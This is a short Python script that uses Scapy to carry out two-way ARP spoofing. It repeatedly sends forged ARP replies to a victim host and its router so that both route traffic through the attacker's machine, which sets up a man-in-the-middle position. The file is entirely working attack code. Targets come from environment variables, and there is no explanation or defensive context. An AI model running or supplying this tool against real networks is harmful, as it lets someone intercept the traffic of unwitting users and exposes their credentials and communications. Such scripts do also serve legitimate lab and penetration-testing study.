from scapy.all import getmacbyip, Ether, ARP, sendp
import time
import threading


from dotenv import load_dotenv
import os
load_dotenv()
victim_ip = os.getenv("victim_ip")
router_ip = os.getenv("router_ip")
iface = os.getenv("iface")

keep_running = True

def arp_spoof(target_ip, spoof_ip, interface="eth0"):
	global keep_running

	target_mac = getmacbyip(target_ip)
	if not target_mac:
		print(f"[!] Could not resolve MAC for {target_ip}.")
		return

	arp_packet = (
		Ether(dst=target_mac) /
		# hwsrc is set automatically to iface's MAC by scapy
		ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op='is-at')
	)

	print(f"[+] ARP Spoofing started:\n{target_ip} thinks {spoof_ip} is at me") #: {get_if_hwaddr(interface)}")
	while keep_running:
		sendp(arp_packet, verbose=False, iface=interface)
		time.sleep(2)

def main():
	global keep_running

	t1 = threading.Thread(target=arp_spoof, args=(victim_ip, router_ip, iface))
	t2 = threading.Thread(target=arp_spoof, args=(router_ip, victim_ip, iface))
	t1.start()
	t2.start()

	try:
		while True:
			time.sleep(1)
	except KeyboardInterrupt:
		print("\n[*] Stopping ARP spoofing...")
		keep_running = False
		t1.join()
		t2.join()

if __name__ == "__main__":
	main()

